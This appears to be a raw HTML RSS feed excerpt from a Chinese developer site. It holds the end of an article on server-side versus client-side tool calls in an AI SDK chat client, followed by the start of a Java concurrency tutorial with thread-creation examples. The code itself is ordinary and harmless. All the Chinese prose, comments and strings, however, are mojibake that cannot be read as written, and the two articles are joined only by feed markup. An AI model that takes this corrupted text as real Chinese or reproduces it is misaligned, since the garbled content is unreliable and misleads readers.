            <span class="hljs-attr">output</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-comment">// ç»“æœéœ€åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²</span>
              <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>,
              <span class="hljs-attr">message</span>: <span class="hljs-string">'å›¾å½¢æ¸²æŸ“æˆåŠŸ'</span>
            })
          });
          <span class="hljs-keyword">break</span>;
        }
        <span class="hljs-comment">// æœåŠ¡ç«¯å·¥å…·ï¼šå‰ç«¯æ— éœ€å¤„ç†ï¼Œç­‰å¾…æœåŠ¡ç«¯è‡ªåŠ¨æ‰§è¡Œ</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'get_shape_library'</span>: {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç­‰å¾…æœåŠ¡ç«¯è¿”å›å½¢çŠ¶åº“ç»“æœ'</span>);
          <span class="hljs-keyword">break</span>;
        }
        <span class="hljs-attr">default</span>:
          <span class="hljs-comment">// æœªçŸ¥å·¥å…·è¿”å›é”™è¯¯</span>
          <span class="hljs-title function_">addToolOutput</span>({
            toolCallId,
            toolName,
            <span class="hljs-attr">output</span>: <span class="hljs-string">''</span>,
            <span class="hljs-attr">error</span>: <span class="hljs-string">`æœªçŸ¥å·¥å…·ï¼š<span class="hljs-subst">${toolName}</span>`</span>
          });
      }
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// å·¥å…·æ‰§è¡Œå¤±è´¥ï¼Œå›ä¼ é”™è¯¯ä¿¡æ¯</span>
      <span class="hljs-title function_">addToolOutput</span>({
        toolCallId,
        toolName,
        <span class="hljs-attr">output</span>: <span class="hljs-string">''</span>,
        <span class="hljs-attr">error</span>: (error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>).<span class="hljs-property">message</span>
      });
    }
  },
  <span class="hljs-comment">// å·¥å…·ç»“æœå›ä¼ åè‡ªåŠ¨è§¦å‘æ¨¡å‹ç»§ç»­å›å¤</span>
  <span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">{ messages }</span>) =&gt;</span> <span class="hljs-literal">true</span>,
  <span class="hljs-attr">onError</span>: <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'èŠå¤©é”™è¯¯ï¼š'</span>, error)
});
</code></pre>
<p><strong>æ³¨è§£</strong>ï¼š</p>
<ul>
<li><code>DefaultChatTransport</code>ï¼šå°è£…å‰ç«¯ä¸æœåŠ¡ç«¯çš„é€šä¿¡é€»è¾‘ï¼Œè‡ªåŠ¨è§£ææœåŠ¡ç«¯è¿”å›çš„æµå¼å“åº”ï¼›</li>
<li><code>onToolCall</code>ï¼šå‰ç«¯æ•è·æ¨¡å‹å·¥å…·è°ƒç”¨æŒ‡ä»¤çš„å”¯ä¸€å…¥å£ï¼›</li>
<li><code>addToolOutput</code>ï¼šå®¢æˆ·ç«¯å·¥å…·ç»“æœå›ä¼ çš„æ ¸å¿ƒæ–¹æ³•ï¼Œ<code>toolCallId</code> å¿…é¡»ä¸æ¨¡å‹è¿”å›çš„ ID ä¸€è‡´ï¼ˆå¦åˆ™æ¨¡å‹æ— æ³•å…³è”ç»“æœï¼‰ï¼›</li>
<li><code>sendAutomaticallyWhen: () =&gt; true</code>ï¼šç¡®ä¿å·¥å…·ç»“æœå›ä¼ åï¼Œæ¨¡å‹è‡ªåŠ¨ç”Ÿæˆæœ€ç»ˆå›å¤ï¼Œå®Œæˆé—­ç¯ã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€æœåŠ¡ç«¯å·¥å…· vs å®¢æˆ·ç«¯å·¥å…·ï¼šäº¤äº’æ ¸å¿ƒåŒºåˆ«</h2>













































<table><thead><tr><th>ç»´åº¦</th><th>æœåŠ¡ç«¯å·¥å…·ï¼ˆå¸¦ executeï¼‰</th><th>å®¢æˆ·ç«¯å·¥å…·ï¼ˆæ—  executeï¼‰</th></tr></thead><tbody><tr><td><strong>æ‰§è¡Œä¸»ä½“</strong></td><td>æœåŠ¡ç«¯ï¼ˆNode.jsï¼‰</td><td>å‰ç«¯ï¼ˆæµè§ˆå™¨ / å®¢æˆ·ç«¯ï¼‰</td></tr><tr><td><strong>æ ¸å¿ƒè§¦å‘é€»è¾‘</strong></td><td>AI.js è‡ªåŠ¨è§¦å‘ <code>execute</code> å‡½æ•°</td><td>å‰ç«¯ <code>onToolCall</code> å›è°ƒæ‰‹åŠ¨è§¦å‘</td></tr><tr><td><strong>ç»“æœè¿”å›æ–¹å¼</strong></td><td><code>execute</code> è¿”å›å€¼ç”± AI.js è‡ªåŠ¨å°è£…å¹¶ä¼ ç»™æ¨¡å‹</td><td>å‰ç«¯è°ƒç”¨ <code>addToolOutput</code> æ‰‹åŠ¨å›ä¼ ç»“æœ</td></tr><tr><td><strong>å…³é”®ä¾èµ–</strong></td><td>æœåŠ¡ç«¯ç¯å¢ƒï¼ˆæ–‡ä»¶ / æ•°æ®åº“ / åç«¯ APIï¼‰</td><td>å‰ç«¯ç¯å¢ƒï¼ˆDOM / å®¢æˆ·ç«¯ SDK / æœ¬åœ°å­˜å‚¨ï¼‰</td></tr><tr><td><strong>é€šä¿¡æˆæœ¬</strong></td><td>æ— é¢å¤–ç½‘ç»œè¯·æ±‚ï¼ˆæœåŠ¡ç«¯å†…éƒ¨å®Œæˆï¼‰</td><td>éœ€ 2 æ¬¡ç½‘ç»œè¯·æ±‚ï¼ˆæŒ‡ä»¤ä¸‹å‘ + ç»“æœå›ä¼ ï¼‰</td></tr><tr><td><strong>æ ¸å¿ƒçº¦æŸ</strong></td><td><code>execute</code> éœ€è‡ªè¡Œæ•è·å¼‚å¸¸ï¼Œè¿”å›å‹å¥½æç¤º</td><td><code>toolCallId</code> å¿…é¡»ä¸æ¨¡å‹è¿”å›çš„ ID ä¸¥æ ¼åŒ¹é…</td></tr><tr><td><strong>å…¸å‹åœºæ™¯</strong></td><td>æ•°æ®æŸ¥è¯¢ã€æ–‡ä»¶è¯»å–ã€åç«¯ API è°ƒç”¨</td><td>å‰ç«¯ UI äº¤äº’ã€æœ¬åœ°æ“ä½œã€å®¢æˆ·ç«¯ SDK è°ƒç”¨</td></tr></tbody></table>
<h2 data-id="heading-4">ä¸‰ã€æ ¸å¿ƒæµç¨‹æ¢³ç†</h2>
<h3 data-id="heading-5">1. æœåŠ¡ç«¯å·¥å…·æµç¨‹</h3>
<p>ç”¨æˆ·æŒ‡ä»¤ â†’ æœåŠ¡ç«¯ <code>streamText</code> â†’ æ¨¡å‹è°ƒç”¨æœåŠ¡ç«¯å·¥å…· â†’ AI.js è‡ªåŠ¨æ‰§è¡Œ <code>execute</code> â†’ ç»“æœè‡ªåŠ¨ä¼ ç»™æ¨¡å‹ â†’ æ¨¡å‹ç”Ÿæˆå›å¤ â†’ å‰ç«¯å±•ç¤ºã€‚</p>
<h3 data-id="heading-6">2. å®¢æˆ·ç«¯å·¥å…·æµç¨‹</h3>
<p>ç”¨æˆ·æŒ‡ä»¤ â†’ æœåŠ¡ç«¯ <code>streamText</code> â†’ æ¨¡å‹è°ƒç”¨å®¢æˆ·ç«¯å·¥å…· â†’ æœåŠ¡ç«¯é€šè¿‡æµå¼å“åº”ä¸‹å‘ <code>toolCall</code> æŒ‡ä»¤ â†’ å‰ç«¯ <code>onToolCall</code> è§¦å‘ â†’ æ‰§è¡Œå®¢æˆ·ç«¯é€»è¾‘ â†’ <code>addToolOutput</code> å›ä¼ ç»“æœ â†’ æœåŠ¡ç«¯å°è£…ç»“æœå–‚ç»™æ¨¡å‹ â†’ æ¨¡å‹ç”Ÿæˆå›å¤ â†’ å‰ç«¯å±•ç¤ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaå¹¶å‘ç¼–ç¨‹åŸºç¡€ä¸è¿›é˜¶ï¼ˆçº¿ç¨‹Â·é”Â·åŸå­ç±»Â·é€šä¿¡ï¼‰]]></title>    <link>https://juejin.cn/post/7592410399918161961</link>    <guid>https://juejin.cn/post/7592410399918161961</guid>    <pubDate>2026-01-08T02:09:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592410399918161961" data-draft-id="7592134330313408555" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaå¹¶å‘ç¼–ç¨‹åŸºç¡€ä¸è¿›é˜¶ï¼ˆçº¿ç¨‹Â·é”Â·åŸå­ç±»Â·é€šä¿¡ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,Android"/> <meta itemprop="datePublished" content="2026-01-08T02:09:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’è²843"/> <meta itemprop="url" content="https://juejin.cn/user/541408646929991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaå¹¶å‘ç¼–ç¨‹åŸºç¡€ä¸è¿›é˜¶ï¼ˆçº¿ç¨‹Â·é”Â·åŸå­ç±»Â·é€šä¿¡ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/541408646929991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’è²843
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:09:20.000Z" title="Thu Jan 08 2026 02:09:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1å°æ—¶+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬ä¸€ç«  çº¿ç¨‹åŸºç¡€</h2>
<h3 data-id="heading-1">1.1 è¿›ç¨‹ä¸çº¿ç¨‹çš„æ¦‚å¿µ</h3>
<h4 data-id="heading-2">è¿›ç¨‹çš„å®šä¹‰å’Œç‰¹ç‚¹</h4>
<p>**è¿›ç¨‹ï¼ˆProcessï¼‰**æ˜¯æ“ä½œç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼ŒåŒ…æ‹¬ä»£ç æ®µã€æ•°æ®æ®µã€å †æ ˆæ®µç­‰ã€‚</p>
<p><strong>è¿›ç¨‹çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>ç‹¬ç«‹æ€§</strong>ï¼šè¿›ç¨‹ä¹‹é—´ç›¸äº’ç‹¬ç«‹ï¼Œä¸€ä¸ªè¿›ç¨‹çš„å´©æºƒä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹</li>
<li><strong>èµ„æºéš”ç¦»</strong>ï¼šæ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œè¿›ç¨‹é—´ä¸èƒ½ç›´æ¥è®¿é—®å¯¹æ–¹çš„å†…å­˜</li>
<li><strong>å¼€é”€å¤§</strong>ï¼šè¿›ç¨‹çš„åˆ›å»ºã€åˆ‡æ¢ã€é”€æ¯éƒ½éœ€è¦è¾ƒå¤§çš„ç³»ç»Ÿå¼€é”€</li>
<li><strong>é€šä¿¡å¤æ‚</strong>ï¼šè¿›ç¨‹é—´é€šä¿¡éœ€è¦é€šè¿‡IPCï¼ˆInter-Process Communicationï¼‰æœºåˆ¶ï¼Œå¦‚ç®¡é“ã€ä¿¡å·ã€å…±äº«å†…å­˜ç­‰</li>
</ul>
<h4 data-id="heading-3">çº¿ç¨‹çš„å®šä¹‰å’Œç‰¹ç‚¹</h4>
<p>**çº¿ç¨‹ï¼ˆThreadï¼‰**æ˜¯CPUè°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œæ˜¯è¿›ç¨‹å†…çš„ä¸€ä¸ªæ‰§è¡Œæµã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åŒ…å«å¤šä¸ªçº¿ç¨‹ï¼Œè¿™äº›çº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´å’Œèµ„æºã€‚</p>
<p><strong>çº¿ç¨‹çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è½»é‡çº§</strong>ï¼šçº¿ç¨‹çš„åˆ›å»ºã€åˆ‡æ¢ã€é”€æ¯å¼€é”€æ¯”è¿›ç¨‹å°å¾—å¤š</li>
<li><strong>å…±äº«èµ„æº</strong>ï¼šåŒä¸€è¿›ç¨‹å†…çš„çº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´ã€æ–‡ä»¶æè¿°ç¬¦ç­‰èµ„æº</li>
<li><strong>å¹¶å‘æ‰§è¡Œ</strong>ï¼šå¤šä¸ªçº¿ç¨‹å¯ä»¥å¹¶å‘æ‰§è¡Œï¼Œæé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡</li>
<li><strong>é€šä¿¡ç®€å•</strong>ï¼šçº¿ç¨‹é—´å¯ä»¥ç›´æ¥é€šè¿‡å…±äº«å†…å­˜è¿›è¡Œé€šä¿¡ï¼Œä½†éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
</ul>
<h4 data-id="heading-4">è¿›ç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ«</h4>








































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>è¿›ç¨‹</th><th>çº¿ç¨‹</th></tr></thead><tbody><tr><td><strong>èµ„æºæ‹¥æœ‰</strong></td><td>æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´å’Œèµ„æº</td><td>å…±äº«è¿›ç¨‹çš„åœ°å€ç©ºé—´å’Œèµ„æº</td></tr><tr><td><strong>åˆ›å»ºå¼€é”€</strong></td><td>å¤§ï¼ˆéœ€è¦åˆ†é…ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼‰</td><td>å°ï¼ˆå…±äº«è¿›ç¨‹èµ„æºï¼‰</td></tr><tr><td><strong>åˆ‡æ¢å¼€é”€</strong></td><td>å¤§ï¼ˆéœ€è¦åˆ‡æ¢åœ°å€ç©ºé—´ï¼‰</td><td>å°ï¼ˆåªéœ€åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼‰</td></tr><tr><td><strong>é€šä¿¡æ–¹å¼</strong></td><td>éœ€è¦IPCæœºåˆ¶ï¼ˆç®¡é“ã€ä¿¡å·ç­‰ï¼‰</td><td>å¯ç›´æ¥é€šè¿‡å…±äº«å†…å­˜é€šä¿¡</td></tr><tr><td><strong>ç‹¬ç«‹æ€§</strong></td><td>å®Œå…¨ç‹¬ç«‹ï¼Œä¸€ä¸ªè¿›ç¨‹å´©æºƒä¸å½±å“å…¶ä»–è¿›ç¨‹</td><td>ç›¸äº’å½±å“ï¼Œä¸€ä¸ªçº¿ç¨‹å´©æºƒå¯èƒ½å¯¼è‡´æ•´ä¸ªè¿›ç¨‹å´©æºƒ</td></tr><tr><td><strong>æ•°é‡</strong></td><td>ç³»ç»Ÿèµ„æºæœ‰é™ï¼Œè¿›ç¨‹æ•°é‡è¾ƒå°‘</td><td>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åˆ›å»ºå¤§é‡çº¿ç¨‹</td></tr></tbody></table>
<h4 data-id="heading-5">å¤šè¿›ç¨‹ vs å¤šçº¿ç¨‹</h4>
<p><strong>å¤šè¿›ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>æ›´å¥½çš„éš”ç¦»æ€§ï¼Œä¸€ä¸ªè¿›ç¨‹çš„å´©æºƒä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹</li>
<li>å¯ä»¥åˆ©ç”¨å¤šæ ¸CPUï¼Œå®ç°çœŸæ­£çš„å¹¶è¡Œ</li>
<li>é€‚åˆéœ€è¦é«˜ç¨³å®šæ€§çš„åœºæ™¯</li>
</ul>
<p><strong>å¤šçº¿ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>åˆ›å»ºå’Œåˆ‡æ¢å¼€é”€å°ï¼Œæ€§èƒ½æ›´é«˜</li>
<li>çº¿ç¨‹é—´é€šä¿¡ç®€å•ï¼Œæ•°æ®å…±äº«æ–¹ä¾¿</li>
<li>é€‚åˆéœ€è¦é¢‘ç¹é€šä¿¡å’Œåä½œçš„åœºæ™¯</li>
</ul>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<ul>
<li>éœ€è¦é«˜éš”ç¦»æ€§ã€é«˜ç¨³å®šæ€§ â†’ é€‰æ‹©å¤šè¿›ç¨‹</li>
<li>éœ€è¦é¢‘ç¹é€šä¿¡ã€å…±äº«æ•°æ® â†’ é€‰æ‹©å¤šçº¿ç¨‹</li>
<li>ç°ä»£åº”ç”¨é€šå¸¸é‡‡ç”¨å¤šçº¿ç¨‹ + è¿›ç¨‹éš”ç¦»çš„æ··åˆæ¨¡å¼</li>
</ul>
<h3 data-id="heading-6">1.2 Javaçº¿ç¨‹çš„åˆ›å»ºæ–¹å¼</h3>
<h4 data-id="heading-7">æ–¹å¼ä¸€ï¼šç»§æ‰¿Threadç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œ: "</span> + Thread.currentThread().getName());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">MyThread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();
        thread.start(); <span class="hljs-comment">// å¯åŠ¨çº¿ç¨‹</span>
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ç®€å•ç›´æ¥ï¼Œé€‚åˆç®€å•çš„çº¿ç¨‹ä»»åŠ¡</li>
<li>Javaæ˜¯å•ç»§æ‰¿ï¼Œç»§æ‰¿Threadåæ— æ³•ç»§æ‰¿å…¶ä»–ç±»</li>
<li>ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºè€¦åˆåº¦é«˜</li>
</ul>
<h4 data-id="heading-8">æ–¹å¼äºŒï¼šå®ç°Runnableæ¥å£ï¼ˆæ¨èï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œ: "</span> + Thread.currentThread().getName());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRunnable</span>());
        thread.start();
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°æ¥å£ï¼Œå¯ä»¥ç»§æ‰¿å…¶ä»–ç±»ï¼Œæ›´çµæ´»</li>
<li>ç¬¦åˆé¢å‘æ¥å£ç¼–ç¨‹çš„åŸåˆ™</li>
<li>ä»»åŠ¡å’Œçº¿ç¨‹åˆ†ç¦»ï¼Œè€¦åˆåº¦ä½</li>
<li><strong>æ¨èä½¿ç”¨</strong></li>
</ul>
<h4 data-id="heading-9">æ–¹å¼ä¸‰ï¼šå®ç°Callableæ¥å£</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.Callable;
<span class="hljs-keyword">import</span> java.util.concurrent.FutureTask;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCallable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Callable</span>&lt;String&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        Thread.sleep(<span class="hljs-number">1000</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå®Œæˆ: "</span> + Thread.currentThread().getName();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        FutureTask&lt;String&gt; futureTask = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FutureTask</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCallable</span>());
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(futureTask);
        thread.start();
        
        <span class="hljs-comment">// è·å–è¿”å›å€¼</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> futureTask.get();
        System.out.println(result);
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å¯ä»¥æœ‰è¿”å›å€¼</li>
<li>å¯ä»¥æŠ›å‡ºå¼‚å¸¸</li>
<li>éœ€è¦é…åˆFutureTaskä½¿ç”¨</li>
<li>é€‚åˆéœ€è¦è¿”å›ç»“æœçš„å¼‚æ­¥ä»»åŠ¡</li>
</ul>
<h4 data-id="heading-10">æ–¹å¼å››ï¼šä½¿ç”¨çº¿ç¨‹æ± åˆ›å»º</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.ExecutorService;
<span class="hljs-keyword">import</span> java.util.concurrent.Executors;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPoolExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);
        
        executor.submit(() -&gt; {
            System.out.println(<span class="hljs-string">"çº¿ç¨‹æ± æ‰§è¡Œä»»åŠ¡: "</span> + Thread.currentThread().getName());
        });
        
        executor.shutdown();
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>çº¿ç¨‹å¤ç”¨ï¼Œæ€§èƒ½æ›´å¥½</li>
<li>ç»Ÿä¸€ç®¡ç†çº¿ç¨‹ç”Ÿå‘½å‘¨æœŸ</li>
<li>æ§åˆ¶å¹¶å‘æ•°é‡</li>
